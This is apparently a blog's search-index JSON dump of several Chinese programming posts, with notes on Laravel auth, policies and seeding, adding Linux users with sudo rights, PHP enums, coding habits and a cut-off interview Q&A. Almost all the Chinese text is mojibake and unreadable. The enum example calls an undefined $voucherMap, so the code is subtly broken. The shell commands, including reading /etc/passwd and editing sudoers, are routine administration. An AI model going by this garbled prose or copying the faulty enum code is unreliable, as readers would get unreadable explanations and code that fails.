æ¥è®°å½•ç”¨æˆ·ç™»å½•çŠ¶æ€ï¼Œæœ€ç»ˆè¿”å› trueiii. å¦‚æœä¸åŒ¹é…ï¼Œè¿”å›false ç™»å½•æˆåŠŸä¹‹åï¼Œå¯ä»¥ä½¿ç”¨Auth::user() è·å–ç”¨æˆ·ä¿¡æ¯ã€‚ 1Route::get(&#39;login&#39;, &#39;SessionsController@create&#39;)-&gt;name(&#39;login&#39;); é€šè¿‡name() æ–¹æ³•å®šä¹‰è·¯ç”±åç§°ï¼Œè¿™æ ·éœ€è¦è®¿é—®è¯¥è·¯ç”±æ—¶ï¼Œç›´æ¥è®¿é—®è¯¥åç§°å°±å¥½ã€‚ ç¬¬äº”ç« å­¦åˆ°äº†ä»€ä¹ˆ Auth è®¤è¯çš„ä½¿ç”¨ äº†è§£Laravel å¸¸ç”¨ç™»å½•æœºåˆ¶çš„å…·ä½“å®ç° é›†æˆBootstrap Javascript ç»„ä»¶ é€šè¿‡ â€œè®°ä½æˆ‘â€ æ¥è®°ä½ç”¨æˆ·ç™»å½•çŠ¶æ€ ç¬¬å…­ç« é€šå¸¸å¼€å‘ç¼–è¾‘ç”¨æˆ·æ—¶ï¼Œéœ€è¦å…ˆä»æ•°æ®åº“ä¸­è·å–åˆ°è¯¥ç”¨æˆ·å½“å‰çš„ä¿¡æ¯ï¼Œç„¶åå†è¿›è¡Œç¼–è¾‘ã€‚ åœ¨Laravel ä¸­ï¼Œåªéœ€è¦å‡ è¡Œä»£ç å°±å¯ä»¥å®Œæˆè¿™ä»¶äº‹æƒ…ã€‚ 123public function edit(User $user)&#123; return view(&quot;users.edit&quot;, compact(&quot;user&quot;))&#125; è¿™é‡Œé€šè¿‡ã€éšå½¢è·¯ç”±ç»‘å®šã€ï¼ŒæŠŠå¯¹åº”ID çš„ç”¨æˆ·çš„å®ä¾‹ä½œä¸ºæ§åˆ¶å™¨å‚æ•°ã€‚ ä¸­é—´ä»¶è®¿é—®é™åˆ¶æœ‰æ—¶æˆ‘ä»¬ä¼šå¸Œæœ›æœªç™»å½•çš„ç”¨æˆ·ï¼Œä¸èƒ½è®¿é—®æŸäº›åŠŸèƒ½ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡ Auth æä¾›çš„ä¸­é—´å¾ˆæ–¹ä¾¿çš„å®Œæˆã€‚ 1234$this-&gt;middleware(&quot;auth&quot;, [ &#x2F;&#x2F; æŒ‡å®šè¿™å‡ ä¸ªæ–¹æ³•ä¸ä½¿ç”¨Auth å»éªŒè¯ &quot;except&quot; &#x3D;&gt; [&quot;show&quot;, &quot;create&quot;, &quot;store&quot;, &quot;index&quot;, &quot;confirmEmail&quot;]]); æˆæƒéªŒè¯ä½†éœ€è¦æ³¨æ„çš„æ—¶ï¼Œè¿™é‡Œä»…ä»…é™åˆ¶çš„æ˜¯æœªç™»å½•ï¼Œè€Œæœ‰äº›åŠŸèƒ½åˆ™æ˜¯éœ€è¦åœ¨ç™»å½•çŠ¶æ€ä¸‹è¿›è¡Œé™åˆ¶ï¼Œæ¯”å¦‚ï¼šID ä¸º1 çš„ç”¨æˆ·ä¸èƒ½ä¿®æ”¹ID ä¸º2 çš„ç”¨æˆ·çš„ä¿¡æ¯ã€‚ è¿™ä¸ªå°±ä¸æ˜¯ä¸­é—´ä»¶èŒè´£èŒƒå›´å†…èƒ½åšçš„äº‹æƒ…äº†ï¼Œè¿™ä¸ªéœ€è¦æˆæƒç­–ç•¥æ¥å®Œæˆã€‚ 12345&#x2F;&#x2F; å®šä¹‰ç­–ç•¥public function update(User $currentUser, User $user)&#123; return $currentUser-&gt;id &#x3D;&#x3D;&#x3D; $user-&gt;id;&#125; è¿˜éœ€è¦åœ¨æ§åˆ¶å™¨ä¸­éªŒè¯æ‰ç®—æ­£çœŸä½¿ç”¨äº†ã€‚ 123456&#x2F;&#x2F; ä½¿ç”¨ç­–ç•¥public function update(User $user)&#123; $this-&gt;authorize(&quot;update&quot;, $user); &#x2F;&#x2F; ... &#125; æ•°æ®å¡«å……æ•°æ®å¡«å……éœ€è¦ä½¿ç”¨Seeder ç±»ï¼Œå¦‚æœéœ€è¦è¿›è¡Œæ•°æ®å¡«å……ï¼Œéœ€è¦è°ƒç”¨ Seeder çš„call æ–¹æ³•ã€‚ ä»¥ç”¨æˆ·æ¨¡å‹ä¸ºä¾‹ï¼Œå¡«å……æ­¥éª¤å¦‚ä¸‹ï¼š é¦–å…ˆåˆ›å»ºç”¨æˆ·å·¥å‚ï¼Œå®šä¹‰å¡«å……æ•°æ® 1$ php artisan make:factory UserFactroy åˆ›å»ºç”¨æˆ·ç”Ÿæˆå™¨ï¼Œå®ç°run æ–¹æ³• 1$ php artisan make:seeder UsersTableSeeder åœ¨DatabaseSeeder ç±»ä¸­å®ç°run æ–¹æ³•ï¼Œè°ƒç”¨ call æ–¹æ³• 123456789public function run()&#123; &#x2F;&#x2F; \\App\\Models\\User::factory(10)-&gt;create(); Model::unguard(); $this-&gt;call(UsersTableSeeder::class); Model::reguard();&#125; é‡ç½®æ•°æ®åº“ 1$ php artisan migrate:refresh å¡«å……æ•°æ® 1php artisan db:seed ç¬¬å…­ç« å­¦åˆ°äº†ä»€ä¹ˆ é€šè¿‡è·¯ç”±ä¼ å‚ä¸æ§åˆ¶å™¨è¿›è¡Œäº¤äº’ï¼ˆéšå½¢è·¯ç”±ç»‘å®š ä½¿ç”¨Patch åŠ¨ä½œæ›´æ–°ç”¨æˆ·ä¿¡æ¯ï¼ŒDelete åŠ¨ä½œåˆ é™¤ç”¨æˆ· ä½¿ç”¨Auth ä¸­é—´ä»¶è¿‡æ»¤ç”¨æˆ·è¯·æ±‚ã€guest ä¸­é—´ä»¶ ä½¿ç”¨æƒé™ç­–ç•¥ï¼Œå¯¹ä¸€äº›å¿…è¦çš„åŠ¨ä½œè¿›è¡Œæƒé™éªŒè¯ ä½¿ç”¨æ•°æ®å¡«å……æ¥ç”Ÿæˆå‡æ•°æ® é‡ç½®æ•°æ®åº“ä»¥åŠè¿ç§»æ•°æ®åº“å¹¶ç”Ÿæˆæ–°æ•°æ® é€šè¿‡æ•°æ®åº“è¿ç§»æ¥è¿›è¡Œæ•°æ®åº“å­—æ®µçš„æ›´æ–° ç¬¬ä¸ƒç« ä»€ä¹ˆæ—¶å€™åº”è¯¥åœ¨æ§åˆ¶å™¨ä¸­å¢åŠ User $user è¿™æ ·çš„ä»£ç å‘¢ï¼Ÿ çœ‹è·¯ç”±ï¼Œçœ‹è·¯ç”±ï¼Œçœ‹è·¯ç”±ï¼Œçœ‹è·¯ç”±æ˜¯å¦‚ä½•å®šä¹‰çš„ã€‚ å¦‚æœè·¯ç”±ä¸­æœ‰è¿™æ ·çš„ä¸œè¥¿ï¼Œé‚£ä¹ˆä¸€å®šè¦æ˜¯è¦çš„ã€‚ 1Route::get(&quot;&#x2F;users&#x2F;&#123;user&#125;&quot;, &quot;UserController@show&quot;)-&gt;name(&quot;users.show&quot;); è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºéšå½¢è·¯ç”±ç»‘å®šã€‚ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç»†èŠ‚å°±æ˜¯å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªè·¯ç”±æˆ–è€…ä¸€ä¸ªæ§åˆ¶å™¨æ˜¯å¦æ˜¯éšå½¢è·¯ç”±ç»‘å®šï¼Ÿé™¤äº†åªæ˜¯çœ‹è·¯ç”±ä¹‹å¤–ï¼Œè¿˜éœ€è¦çœ‹æ˜¯å¦æœ‰ä¸ä¹‹å¯¹åº”çš„æ¨¡å‹ã€‚è¿™ä¸€ç‚¹å¾ˆé‡è¦å“¦ã€‚ å¦å¤–ä»€ä¹ˆæ—¶å€™éœ€è¦Request $request å‘¢ï¼Ÿä¹Ÿæ˜¯çœ‹è·¯ç”±ï¼ŒPost æ–¹æ³•ä¸€å®šéœ€è¦çš„ã€‚ 12345678910111213&#x2F;&#x2F; å®šä¹‰è·¯ç”±Route::get(&quot;password&#x2F;&#123;token&#125;&quot;, &quot;PasswordController@showResetForm&quot;)-&gt;name(&quot;password.reset&quot;);&#x2F;&#x2F; æ–¹å¼ä¸€public function showResetForm($token)&#123; var_dump($token);&#125;&#x2F;&#x2F; æ–¹å¼äºŒpublic function showResetForm(Request $request)&#123; $token &#x3D; $request-&gt;route()-&gt;parameter(&#39;token&#39;); var_dump($token);&#125; Laravel ä¸­çš„å‡ ç§æ“ä½œæ•°æ®åº“çš„æ–¹å¼ï¼š 1234567891011121314151617181920public function store(User $user)&#123; &#x2F;&#x2F; æ–¹å¼ä¸€ $user-&gt;name &#x3D; &quot;boo&quot;; $user-&gt;save(); &#x2F;&#x2F; æ–¹å¼äºŒ $user-&gt;update([ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, ]); &#x2F;&#x2F; æ–¹å¼ä¸‰ User::where(&quot;id&quot;, $user-&gt;id)-&gt;update([ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, ]); &#x2F;&#x2F; æ–¹å¼å›› DB::table(&quot;users&quot;)-&gt;where(&quot;id&quot;, $user-&gt;id)-&gt;update([ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, ]);&#125; ç¬¬ä¸ƒç« å­¦åˆ°äº†ä»€ä¹ˆ ä½¿ç”¨è¿ç§»ä¸ºæ•°æ®åº“è¡¨å¢åŠ å­—æ®µ åœ¨æ¨¡å‹ä¸­ï¼Œå®šä¹‰ç›‘å¬å™¨ï¼Œç›‘å¬æ“ä½œ ä½¿ç”¨Laravel å‘é€é‚®ä»¶åŠŸèƒ½ åœ¨æœ¬åœ°ï¼ˆlogï¼‰è°ƒè¯•å‘é€é‚®ä»¶åŠŸèƒ½ é€šè¿‡é‚®ä»¶å‘é€æ³¨å†Œé“¾æ¥æ¥æ¿€æ´»ç”¨æˆ· é€šè¿‡é‚®ä»¶æ¥æ‰¾å›å¯†ç  ç¬¬å…«ç«  Laravel ä¸­æ¨¡å‹ä¸æ¨¡å‹ä¹‹é—´æ˜¯å¦‚ä½•è¿›è¡Œå…³è”çš„å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯é€šè¿‡ä¸»é”®ä¸å¤–é”®è¿›è¡Œå…³è”ã€‚ é€šè¿‡Eloquent å…³è”æ¨¡å‹ä¸æ¨¡å‹ä¹‹é—´çš„å…³ç³»ï¼š ä¸€å¯¹ä¸€ ä¸€å¯¹å¤š å¤šå¯¹ä¸€ å¤šå¯¹å¤š Auth::user() æ–¹æ³•å¯ä»¥è·å–åˆ°å½“å‰ç”¨æˆ·çš„å®ä¾‹ã€‚ åœ¨Useræ¨¡å‹ä¸­å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•ï¼Œç„¶åé€šè¿‡Auth::user()è·å–åˆ°çš„å®ä¾‹è¿›è¡Œè°ƒç”¨ã€‚ å¦‚æœæ²¡æœ‰ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œéœ€è¦è¿™æ ·åˆ›å»ºä¸€æ¡å¾®åšï¼š 1App\\Models\\Status::create() å¦‚æœå°†ç”¨æˆ·æ¨¡å‹ä¸å¾®åšæ¨¡å‹è¿›è¡Œå…³è”ä¹‹åï¼Œå¯ä»¥å¾—åˆ°ä»¥ä¸‹æ–¹æ³•ï¼š 1$user-&gt;statuses()-&gt;create() å…¶ä¸­statuses() æ˜¯åœ¨ç”¨æˆ·æ¨¡å‹ä¸­å®šä¹‰å¥½çš„ï¼ˆåç§°å¯ä»¥ä¸ä¸€æ ·)ï¼š 12345public function statuses()&#123; &#x2F;&#x2F; userè¡¨æ­£å‘å…³è” statusè¡¨ return $this-&gt;hasMany(Status::class, &quot;user_id&quot;, &quot;id&quot;);&#125; ç¬¬å…«ç« å­¦åˆ°äº†ä»€ä¹ˆ ä¸¤ä¸ªæ¨¡å‹ä¹‹é—´å¦‚ä½•è¿›è¡Œå…³è” é€šè¿‡æ¨¡å‹å…³è”è·å–æ•°æ® å¯¹å¾®åšå‘å¸ƒæ—¶é—´è¿›è¡Œå‹å¥½å¤„ç†ï¼Œå¹¶ä¸­æ–‡åŒ– å»ºç«‹å·¥å‚ã€ä»¥åŠç”Ÿæˆå™¨ã€å¹¶ç”Ÿæˆå‡æ•°æ® é€šè¿‡æ•°æ®å…³è”æ¥åˆ›å»ºå¾®åš é€šè¿‡æ•°æ®å…³è”æ¥åˆ é™¤å¾®åš ä¿®å¤æ‰¹é‡èµ‹å€¼çš„é”™è¯¯ ç¬¬ä¹ç« æ­£å¼å†™SQL ä¹‹å‰ï¼Œå¯ä»¥å…ˆä½¿ç”¨tinker é€šè¿‡æ¨¡å‹æ“ä½œæ•°æ®ã€‚ é€šè¿‡åœ¨æ¨¡å‹ä¸­å®šä¹‰ä¸€äº›æ–¹æ³•ï¼Œä»¥ä¾¿å¯ä»¥åœ¨å…¶ä»–åœ°æ–¹ç›´æ¥è·å–åˆ°æ•°æ®ã€‚ ç¬¬ä¹ç« å­¦åˆ°äº†ä»€ä¹ˆ å¤šå¯¹å¤šå…³ç³»åº”ç”¨ æ–°å¢å’Œé”€æ¯å¤šå¯¹å¤šå…³è” ä½¿ç”¨ with æ¥é¿å…N+1 é—®é¢˜","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Linux æ·»åŠ ç”¨æˆ·åŠææƒ","slug":"linux-to-add-users-and-rights","date":"2021-03-12T14:04:50.000Z","updated":"2021-03-13T04:18:51.999Z","comments":true,"path":"linux-to-add-users-and-rights/","link":"","permalink":"https://www.0x2beace.com/linux-to-add-users-and-rights/","excerpt":"åˆšæ‹¿åˆ°ä¸€å°æœåŠ¡å™¨æ—¶ï¼Œé€šå¸¸ä¼šç¦ç”¨root ç”¨æˆ·ç™»å½•ï¼Œè€Œä½¿ç”¨å…¶ä»–æ™®é€šç”¨æˆ·ï¼Œè¿™æ—¶å°±éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ã€‚","text":"åˆšæ‹¿åˆ°ä¸€å°æœåŠ¡å™¨æ—¶ï¼Œé€šå¸¸ä¼šç¦ç”¨root ç”¨æˆ·ç™»å½•ï¼Œè€Œä½¿ç”¨å…¶ä»–æ™®é€šç”¨æˆ·ï¼Œè¿™æ—¶å°±éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ã€‚ æ·»åŠ ç”¨æˆ·åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼š 1$ useradd boo è®¾ç½®å¯†ç ï¼š 1$ passwd boo ææƒæ­¤æ—¶æ­¤ç”¨æˆ·å·²ç»å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰ææƒï¼Œæ‰€ä»¥å¾ˆå¤šäº‹æƒ…åšä¸äº†ï¼Œè¿™æ—¶å¯ä»¥æŠŠè¯¥ç”¨æˆ·åŠ å…¥sudo ç”¨æˆ·ç»„ï¼Œé€šè¿‡sudoå‘½ä»¤æ¥è¿›è¡Œææƒã€‚ 1$ usermod -G sudo boo ä¸€èˆ¬ç›´æ¥å°±åŠ å…¥æˆåŠŸäº†ï¼Œä½†æ˜¯æœ‰äº›å‘è¡Œç‰ˆæœ¬é»˜è®¤å¹¶æ²¡æœ‰sudoç”¨æˆ·ç»„ï¼Œæ‰€ä»¥è¿™æ—¶éœ€è¦å…ˆæ·»åŠ ç”¨æˆ·ç»„ã€‚ 1$ groupadd sudo æ‰‹åŠ¨æ·»åŠ å®Œç”¨æˆ·ç»„ä¹‹åï¼Œè¿˜éœ€è¦ä¿®æ”¹sudoersé…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œæœ‰å‡ ç§æ–¹å¼ï¼Œæ ¹æ®å®é™…æƒ…å†µè¿›è¡Œé€‰æ‹©ï¼š å…è®¸sudo ç»„çš„æˆå‘˜æ‰§è¡Œä»»ä½•å‘½ä»¤ 12345$ sudo visudo &#x2F;&#x2F; æˆ–è€… sudo vim &#x2F;etc&#x2F;sudoers&#x2F;&#x2F; æ·»åŠ ä»¥ä¸‹å†…å®¹# the &#39;sudo&#39; group has all the sudo privileges%sudo ALL&#x3D;(ALL:ALL) ALL ç›´æ¥å…è®¸è¯¥ç”¨æˆ·æ‰§è¡Œä»»ä½•å‘½ä»¤12345$ sudo visudo &#x2F;&#x2F; æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼Œæ³¨æ„ï¼šæ²¡æœ‰% # Allow boo to run any commands anywhereboo ALL&#x3D;(ALL:ALL) ALL é€šå¸¸è¿˜æ˜¯å»ºè®®å°†ç”¨æˆ·æ·»åŠ è‡³sudo ç”¨æˆ·ç»„ï¼Œç„¶åèµ‹äºˆsudo ç»„æˆå‘˜æƒé™ï¼Œè€Œä¸æ˜¯ç›´æ¥å¯¹å…·ä½“æŸä¸ªç”¨æˆ·è¿›è¡Œææƒã€‚ æ€»ç»“æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·çš„åˆ—è¡¨ï¼š 1$ cat &#x2F;etc&#x2F;passwd æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·ç»„ï¼š 1$ cat &#x2F;etc&#x2F;group æŸ¥çœ‹å½“å‰ç™»å…¥ç”¨æˆ·çš„ç»„ï¼š 1$ groups æŸ¥çœ‹æŒ‡å®šç”¨æˆ·æ‰€åœ¨çš„ç»„ï¼š 1$ groups usernmae æ·»åŠ ç”¨æˆ·ï¼š 1$ useradd username è®¾ç½®(é‡ç½®)å¯†ç ï¼š 1$ passwd username æ·»åŠ ç”¨æˆ·ç»„ï¼š 1$ groupadd group_name å°†æŸä¸ªç”¨æˆ·æ·»åŠ åˆ°æŸä¸ªç»„ï¼š 1$ usermod -G group_name username ç¼–è¾‘sudoers é…ç½®æ–‡ä»¶ï¼š 1$ sudo visudo","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"å¦‚ä½•åœ¨ PHP ä¸­ä½¿ç”¨æšä¸¾","slug":"how-do-I-use-enumerations-in-php","date":"2021-03-08T12:57:51.000Z","updated":"2021-03-08T12:59:13.169Z","comments":true,"path":"how-do-I-use-enumerations-in-php/","link":"","permalink":"https://www.0x2beace.com/how-do-I-use-enumerations-in-php/","excerpt":"åœ¨ç¼–å†™ä¸šåŠ¡ä»£ç æ—¶ï¼Œå¸¸å¸¸ä¼šé‡åˆ°çŠ¶æ€æˆ–è€…ç±»å‹ä¸ä¸€è‡´é€ æˆçš„é€»è¾‘åˆ†æ”¯ï¼Œè¿™æ—¶ï¼Œæœ€å¿Œè®³çš„æ˜¯ç›´æ¥åœ¨ä¸šåŠ¡ä»£ç ä¸­å¯¹æ•°å€¼è¿›è¡Œåˆ¤æ–­ã€‚","text":"åœ¨ç¼–å†™ä¸šåŠ¡ä»£ç æ—¶ï¼Œå¸¸å¸¸ä¼šé‡åˆ°çŠ¶æ€æˆ–è€…ç±»å‹ä¸ä¸€è‡´é€ æˆçš„é€»è¾‘åˆ†æ”¯ï¼Œè¿™æ—¶ï¼Œæœ€å¿Œè®³çš„æ˜¯ç›´æ¥åœ¨ä¸šåŠ¡ä»£ç ä¸­å¯¹æ•°å€¼è¿›è¡Œåˆ¤æ–­ã€‚ é‚£ä¹ˆæ›´å¥½çš„æ–¹å¼åº”è¯¥æ˜¯æ€æ ·å‘¢ï¼Ÿä½¿ç”¨æšä¸¾ã€‚ ä½¿ç”¨æšä¸¾æœ‰ä»¥ä¸‹å‡ ä¸ªå¥½å¤„ï¼š å‡å°‘å› ä¸ºç›´æ¥è¾“å…¥æ•°å­—è€Œå¯¼è‡´çš„é”™è¯¯ ä½¿ä»£ç æ›´æ˜“äºé˜…è¯» æ–¹ä¾¿ç»´æŠ¤ï¼Œåé¢éœ€è¦æ·»åŠ æ–°çš„ç±»å‹æ—¶ï¼Œä¸ä¼šçªå…€ PHP æœ¬èº«ä¸æ”¯æŒæšä¸¾ï¼Œä½†æ˜¯ä½¿ç”¨ç±»ä¸­çš„å¸¸é‡å»å®šä¹‰å¯ä»¥å®ç°ç­‰ä»·çš„æ•ˆæœã€‚ å®šä¹‰æšä¸¾ä¸‹é¢ä¸ºç”¨æˆ·ç±»å‹åˆ›å»ºä¸€ä¸ªæšä¸¾ï¼Œç”¨æˆ·å¯ä»¥æ˜¯ä»¥ä¸‹ä¸‰ç§ç±»å‹ä¹‹ä¸€ï¼š æ™®é€šç”¨æˆ· ç®¡ç†å‘˜ è¶…çº§ç®¡ç†å‘˜ çœ‹èµ·æ¥åƒè¿™æ ·ï¼š 123456class UserType extends Enum&#123; const MEMBER &#x3D; 1; const ADMIN &#x3D; 2; const SUPERADMIN &#x3D; 3;&#125; ä½¿ç”¨æšä¸¾123if ($user-&gt;type &#x3D;&#x3D;&#x3D; UserType::MEMBER)&#123; &#x2F;&#x2F; todo &#125; å¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨æšä¸¾ï¼Œä»£ç å¯èƒ½å°±ä¼šå˜æˆè¿™æ ·ï¼š 1234567if ($user-&gt;type &#x3D;&#x3D;&#x3D; 1) &#123; &#x2F;&#x2F; è¿™ä¸ª1è¡¨ç¤ºä»€ä¹ˆ?? &#x2F;&#x2F; todo&#125;if ($user-&gt;type &#x3D;&#x3D;&#x3D; &#39;Member&#39;) &#123; &#x2F;&#x2F; è¿™ä»–å¦ˆå’‹ä¹ˆåˆæ˜¯å­—ç¬¦ä¸² ğŸ˜ &#x2F;&#x2F; todo &#125; å®šä¹‰è·å–å™¨å¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¸Œæœ›èƒ½è·å–åˆ°æŸä¸ªç±»å‹å¯¹åº”çš„å…·ä½“å«ä¹‰ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡å®šä¹‰è·å–å™¨æ¥è·å–ã€‚ 12345678910111213class UserType extends Enum&#123; public static $userType &#x3D; [ self::MEMBER &#x3D;&gt; &quot;æ™®é€šä¼šå‘˜&quot;, self::ADMIN &#x3D;&gt; &quot;ç®¡ç†å‘˜&quot;, self::SUPERADMIN &#x3D;&gt; &quot;è¶…çº§ç®¡ç†å‘˜&quot; ]; public static function getUserType($type) &#123; return self::$voucherMap[$type]; &#125; &#125; è¿™æ ·å½“æˆ‘ä»¬åœ¨è°ƒç”¨getUserType æ–¹æ³•æ—¶ï¼Œåªéœ€è¦ä¼ å…¥å¯¹åº”çš„ç±»å‹ï¼Œå°±èƒ½è·å–åˆ°æ™®é€šä¼šå‘˜ã€ç®¡ç†å‘˜ã€è¶…çº§ç®¡ç†å‘˜äº†ã€‚ å‚è€ƒé“¾æ¥ åœ¨ Laravel ä¸­ä½¿ç”¨æšä¸¾","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"å†™ä»£ç çš„å¥½ä¹ æƒ¯","slug":"good-habit-of-writing-code","date":"2021-03-02T14:20:53.000Z","updated":"2021-04-10T01:52:32.612Z","comments":true,"path":"good-habit-of-writing-code/","link":"","permalink":"https://www.0x2beace.com/good-habit-of-writing-code/","excerpt":"å‰æ®µæ—¶é—´çœ‹åˆ°ä¸€ç¯‡æ¯”è¾ƒç«çš„æ–‡ç« ï¼Œç»“åˆè‡ªå·±çš„ä¸€äº›ç»éªŒï¼Œæ•´ç†ä»¥ä¸‹â€œå¥½ä¹ æƒ¯â€ã€‚","text":"å‰æ®µæ—¶é—´çœ‹åˆ°ä¸€ç¯‡æ¯”è¾ƒç«çš„æ–‡ç« ï¼Œç»“åˆè‡ªå·±çš„ä¸€äº›ç»éªŒï¼Œæ•´ç†ä»¥ä¸‹â€œå¥½ä¹ æƒ¯â€ã€‚ ä¿®æ”¹å®Œä»£ç ï¼Œä¸€å®šè¦è®°å¾—è‡ªæµ‹ä¸€ä¸‹ï¼Œå³ä½¿åªæ˜¯æ”¹äº†ä¸€ä¸ªå˜é‡ã€‚ æ–¹æ³•å…¥å‚å°½é‡éƒ½åšæ ¡éªŒã€‚ æ·»åŠ æ–°æ¥å£æ—¶ï¼Œéœ€è¦æ³¨æ„è€æ¥å£çš„å…¼å®¹æ€§ã€‚ å¯¹äºå¤æ‚çš„ä»£ç é€»è¾‘ï¼Œæœ‰å¿…è¦å†™æ¸…æ¥šæ³¨é‡Šã€‚ ä½¿ç”¨å®ŒIO èµ„æºæµï¼Œä¸€å®šè¦è®°å¾—å…³é—­ã€‚ å°½é‡ä¸è¦åœ¨å¾ªç¯é‡Œè¿œç¨‹è°ƒç”¨æˆ–è€…æ•°æ®åº“æ“ä½œï¼Œç‰¹åˆ«æ˜¯selectã€‚ä¼˜å…ˆè€ƒè™‘æ‰¹å¤„ç†ã€‚ è€ƒè™‘å¹¶å‘ä¸€è‡´æ€§çš„é—®é¢˜ã€‚ æ ¹æ®å®é™…çš„ä¸šåŠ¡åœºæ™¯å»æ‹†è§£åŠŸèƒ½ï¼Œä¸æ˜¯æ‰€æœ‰çš„åŠŸèƒ½éƒ½éœ€è¦ç”¨ç‰¹åˆ«é«˜æ·±çš„æŠ€æœ¯å»å®ç°ã€‚ é¿å…å¤šå±‚if...elseåµŒå¥—ã€‚ ä¸€ä¸ªç±»åšå¥½ä¸€ä»¶äº‹æƒ…ï¼Œä¸€ä¸ªæ§åˆ¶å™¨ç»´æŠ¤å¥½ä¸€ä¸ªåŠŸèƒ½ã€‚ å‚è€ƒé“¾æ¥ å†™ä»£ç æœ‰è¿™16ä¸ªå¥½ä¹ æƒ¯ï¼Œå¯ä»¥å‡å°‘80%éä¸šåŠ¡çš„bug","categories":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"PHP å¸¸è§é¢è¯•é¢˜æ•´ç†","slug":"php-common-interview-questions","date":"2021-02-25T11:51:45.000Z","updated":"2021-03-12T14:05:10.121Z","comments":true,"path":"php-common-interview-questions/","link":"","permalink":"https://www.0x2beace.com/php-common-interview-questions/","excerpt":"å¹´å‰å¹´åè¿™æ®µæ—¶é—´ä¸€ç›´åœ¨ä¸ºé¢è¯•åšå‡†å¤‡ï¼Œæœ¬æ–‡å°†ä»ç½‘ç»œã€PHPã€Mysqlã€Redisã€Linux è¿™å‡ éƒ¨åˆ†æ•´ç†ä¸€ä¸‹å¸¸è§çš„ä¸€äº›é¢è¯•ç®€ç­”é¢˜ã€‚","text":"å¹´å‰å¹´åè¿™æ®µæ—¶é—´ä¸€ç›´åœ¨ä¸ºé¢è¯•åšå‡†å¤‡ï¼Œæœ¬æ–‡å°†ä»ç½‘ç»œã€PHPã€Mysqlã€Redisã€Linux è¿™å‡ éƒ¨åˆ†æ•´ç†ä¸€ä¸‹å¸¸è§çš„ä¸€äº›é¢è¯•ç®€ç­”é¢˜ã€‚ ç½‘ç»œç¯‡å¸¸è§çš„çŠ¶æ€ç åŠå…¶å«ä¹‰ çŠ¶æ€ç  å«ä¹‰ 200 è¯·æ±‚æˆåŠŸ 301 é‡å®šå‘ 304 èµ„æºæœªè¢«ä¿®æ”¹å¯ä»¥ä½¿ç”¨æ—§èµ„æº 404 èµ„æºæ‰¾ä¸åˆ° 403 è¯·æ±‚è¢«æ‹’ç» 500 æœåŠ¡ç«¯é”™è¯¯ 502 ç½‘å…³é”™è¯¯ 504 ç½‘å…³è¶…æ—¶ è¡¨å•æäº¤ get å’Œ post çš„åŒºåˆ« Get è¯·æ±‚æ˜¯å°†è¯·æ±‚å‚æ•°æ”¾åœ¨ url åé¢ï¼Œç­‰åŒäºç›´æ¥æ”¾åœ¨äº†è¯·æ±‚å¤´ä¸­ï¼ŒPost è¯·æ±‚åˆ™æ˜¯æŠŠè¯·æ±‚å‚æ•°æ”¾åœ¨è¯·æ±‚ä½“ä¸­ã€‚ Post æ›´å®‰å…¨ï¼Œä¸ä¼šä½œä¸ºurlçš„ä¸€éƒ¨åˆ†ï¼Œä¸ä¼šè¢«ç¼“å­˜åŠä¿å­˜åœ¨æµè§ˆå™¨è®°å½•ä¸­ã€‚ Post èƒ½å‘é€æ›´å¤šçš„å†…å®¹åŠæ›´å¤šçš„æ•°æ®ç±»å‹ï¼Œget åªèƒ½å‘é€ 2048 ä¸ªASCII å­—ç¬¦ Post æ¯”Get æ…¢ï¼ˆåŸå› æ˜¯å› ä¸ºpost éœ€è¦åœ¨æœåŠ¡å™¨ç¡®è®¤ä¹‹åå†å‘é€æ•°æ®ï¼‰ Get é€šå¸¸ç”¨äºèµ„æºçš„è·å–ï¼ŒPost é€šå¸¸ç”¨äºèµ„æºçš„æ›´æ–° http å’Œ https çš„åŒºåˆ« é¦–å…ˆä¸¤è€…æ‰€ä½¿ç”¨çš„åè®®ä¸ä¸€æ ·ï¼Œå…¶ç«¯å£ä¹Ÿä¸ä¸€æ ·ã€‚ è¿™ä¹Ÿæ˜¯https æ¯” http è¦å®‰å…¨çš„åŸå› ï¼Œhttp æ˜¯æ˜æ–‡ä¼ 